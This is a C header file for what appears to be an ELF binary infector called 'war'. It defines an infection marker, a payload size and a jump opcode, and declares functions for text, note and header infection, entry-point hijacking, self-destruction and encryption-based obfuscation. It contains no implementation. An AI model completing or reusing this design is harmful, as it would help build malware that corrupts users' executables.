#ifndef WAR_H
#define WAR_H
#define _GNU_SOURCE

////////////////////////////////////////////////////////////////////////////////
/// INCLUDES 
////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <stdlib.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include <sched.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/random.h>

////////////////////////////////////////////////////////////////////////////////
/// MACROS 
////////////////////////////////////////////////////////////////////////////////

#define ELF_MAGIC_NUMBER 1179403647
#define INFECTED_MAGIC_NUMBER 0x4e5750
#define X86_64_MAGIC_NUMBER 2

#define LEFT 0
#define RIGHT 1

//#define PAYLOAD_SIZE (size_t)((void *)__exit - (void *)__entry)
#define PAYLOAD_SIZE 36

#define JMP_OFFSET 66
#define JMP_OPCODE 0xe9

#define STACK_SIZE 1024 * 64

////////////////////////////////////////////////////////////////////////////////
/// ENUMS
////////////////////////////////////////////////////////////////////////////////

enum e_context
{
	SUCCESS,
	FAILURE,
};

////////////////////////////////////////////////////////////////////////////////
/// STRUCTURES
////////////////////////////////////////////////////////////////////////////////

struct s_note
{
	Elf64_Phdr *data;
	Elf64_Phdr *self;
};

struct s_text
{

};

struct s_host
{
	Elf64_Ehdr *header;

	size_t filesize;
	const char *filename;

	struct s_note *note;
	struct s_text *text;

	Elf64_Addr old_entry;
	Elf64_Addr new_entry;

	void *stack;
};

struct s_keychain
{
	size_t key[2];

	size_t junk[2][2];
};

////////////////////////////////////////////////////////////////////////////////
/// DECLARATIONS 
////////////////////////////////////////////////////////////////////////////////

// LINEAR FLOW 
void __entry(void);

void war(struct s_host *host, struct s_keychain *keychain, enum e_context context);
void host_constructor(struct s_host *host, struct s_keychain *keychain, const char *filename, enum e_context context);
void criteria(struct s_host *host, struct s_keychain *keychain, enum e_context context);
void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_context contect);
void note_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_context context);

void __exit(void *stack);

// STUB (OBFUSCATION)
__attribute__((hot)) void update_keychain_left(struct s_keychain *keychain, const char *caller, const size_t size);
__attribute__((hot)) void update_keychain_right(struct s_keychain *keychain, const char *caller, const size_t size);
__attribute__((hot)) void decrypt_left(const struct s_keychain *keychain, char *callee, const size_t size);
__attribute__((hot)) void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size);

#endif
